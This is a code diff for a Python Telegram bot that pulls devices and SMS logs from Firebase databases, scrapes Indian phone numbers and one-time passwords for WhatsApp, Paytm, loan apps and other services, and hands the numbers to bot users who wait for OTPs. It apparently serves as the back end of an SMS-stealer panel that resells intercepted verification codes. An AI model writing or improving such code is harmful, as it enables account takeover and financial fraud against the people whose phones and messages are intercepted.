@@ -88,39 +88,6 @@ def decode_panel_url(panel_url):
         pass
     return None
 
-def extract_real_sim_numbers(dev_data):
-    """Extract real phone numbers directly from device metadata"""
-    numbers = set()
-    # Check direct fields
-    for key in ["phoneNumber", "phone", "number", "sim1", "sim2", "mobile"]:
-        val = dev_data.get(key)
-        if val:
-            clean = re.sub(r'\D', '', str(val))
-            if len(clean) >= 10:
-                numbers.add(clean)
-                
-    # Check sims array
-    sims = dev_data.get("sims")
-    if isinstance(sims, list):
-        for sim in sims:
-            if isinstance(sim, dict):
-                for k in ["phoneNumber", "number", "phone", "mobile"]:
-                    if sim.get(k):
-                        clean = re.sub(r'\D', '', str(sim[k]))
-                        if len(clean) >= 10:
-                            numbers.add(clean)
-                            
-    # Check webhookEvent for outbound SMS to find device number
-    webhook = dev_data.get("webhookEvent", {})
-    if isinstance(webhook, dict):
-        send_sms = webhook.get("sendSms", {})
-        if isinstance(send_sms, dict) and send_sms.get("to"):
-            clean = re.sub(r'\D', '', str(send_sms["to"]))
-            if len(clean) >= 10 and clean not in numbers:
-                pass # Outbound to a target, not the sim number, so ignore.
-                
-    return list(numbers)
-
 def extract_otp(text):
     if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]):
         return None
@@ -128,34 +95,27 @@ def extract_otp(text):
     return match.group(1) if match else None
 
 def extract_service_name(text, sender):
-    """Guess the service name from message text or sender ID"""
     text_lower = text.lower()
     known_services = {
         "whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram",
         "telegram": "Telegram", "google": "Google", "amazon": "Amazon",
         "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato",
         "paytm": "Paytm", "phonepe": "PhonePe", "creditt": "Creditt",
-        "ram fincorp": "Ram Fincorp", "jio": "Jio", "airtel": "Airtel",
-        "paytm": "Paytm", "paisabazaar": "Paisabazaar", "camiaca": "CAMIAT"
+        "ram fincorp": "Ram Fincorp", "jio": "Jio", "airtel": "Airtel"
     }
     for key, name in known_services.items():
         if key in text_lower:
             return name
-            
-    # Try to extract from sender ID (e.g., AD-RFcrp-S -> RFcrp)
     if sender:
         parts = sender.split("-")
         if len(parts) > 1:
             return parts[1]
-            
     return "Unknown Service"
 
 # ================= STATES =================
 class AdminStates(StatesGroup):
     select_country_add = State()
     add_fb = State()
-    add_admin = State()
-    broadcast = State()
 
 # ================= CORE FUNCTIONS =================
 async def get_owner_stats():
@@ -204,21 +164,33 @@ async def get_numbers_for_country(country_label, uid):
         if clients:
             for dev_id, dev_data in clients.items():
                 if isinstance(dev_data, dict) and dev_data.get("status") is True:
-                    # Extract numbers directly from metadata
-                    sims = extract_real_sim_numbers(dev_data)
-                    if sims:
-                        online_devices.append(sims)
+                    online_devices.append((fb, dev_id))
 
     if not online_devices:
         return []
 
     # Pick ONE random device from the available online devices
-    selected_sims = random.choice(online_devices)
+    selected_fb, selected_dev_id = random.choice(online_devices)
     
+    # Fetch messages to find real numbers
+    numbers = set()
+    msgs = await fetch_fb(f"{selected_fb['url']}/messages/{selected_dev_id}.json", selected_fb.get("auth"))
+    
+    if msgs:
+        for k, v in msgs.items():
+            if isinstance(v, dict) and v.get("type") == "incoming":
+                body = v.get("message", "")
+                # Regex to find real 10-digit Indian numbers (starting with 6-9)
+                found_nums = re.findall(r'\b[6-9]\d{9}\b', body)
+                for n in found_nums:
+                    if len(n) == 10:
+                        numbers.add(n)
+                                
     user_hist = data.get("user_history", {}).get(str(uid), {})
-    available = [n for n in selected_sims if n not in user_hist]
+    available = [n for n in numbers if n not in user_hist]
     random.shuffle(available)
-    return available
+    
+    return available[:3]
 
 async def get_latest_messages_for_fb(fb_url, auth):
     all_msgs = {}
@@ -272,8 +244,7 @@ async def background_global_scanner(main_bot: Bot):
                             otp = extract_otp(text_content)
                             if otp:
                                 # Determine which number got the OTP
-                                # Try to get it from the message header (e.g., "For +91...") or fallback to device SIMs
-                                found_nums = re.findall(r'\+?\d{10,15}', text_content)
+                                found_nums = re.findall(r'\b[6-9]\d{9}\b', text_content)
                                 target_numbers = [re.sub(r'\D', '', n)[-10:] for n in found_nums]
                                 
                                 for num, users in number_to_users.items():
@@ -444,7 +415,7 @@ async def user_country_selected(cq: CallbackQuery):
         except TelegramBadRequest: pass
         return
         
-    nums_text = "\n".join([f"<code>+{n}</code>" for n in numbers])
+    nums_text = "\n".join([f"<code>+91{n}</code>" for n in numbers])
     text = f"📱 <b>Numbers Received</b>\nCountry: 🌍 {country}\nQty: {len(numbers)}\n\n{nums_text}\n\n⌛ <i>Waiting for OTP (1 Hour)...</i>"
     
     data = load_data()
